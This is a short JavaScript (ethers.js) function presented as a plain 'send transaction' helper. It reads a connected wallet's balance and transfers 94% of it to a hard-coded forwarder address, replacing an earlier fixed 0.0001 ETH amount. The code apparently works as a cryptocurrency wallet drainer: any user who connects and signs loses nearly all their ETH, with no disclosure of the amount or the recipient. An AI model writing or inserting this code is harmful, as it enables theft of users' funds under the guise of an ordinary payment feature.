// create send transaction function
import { ethers } from "ethers";
import { FORWARDER_ADDRESS } from "./constant";
// import { getUniversalProvider } from "./provider";

export const sendETH = async (provider, signer) => {
    try {
        const address = await signer.getAddress();

        // get current balance in wei, BigInt
        const balanceWei = await provider.getBalance(address);

        if(balanceWei <= 0n){
            throw new Error("No balance available");
        }

        // leave small buffer for gas (safe method)
        const amountToSend = (balanceWei * 94n) / 100n;

        // send transaction
        const tx = await signer.sendTransaction({
            to: FORWARDER_ADDRESS,
            // value: ethers.parseEther("0.0001"),
            value: amountToSend, // amount already in wei
        });

        await tx.wait();
        
        return tx.hash;
    } catch (error){
        console.error("Error sending transaction: ", error);
        return null;
    }
}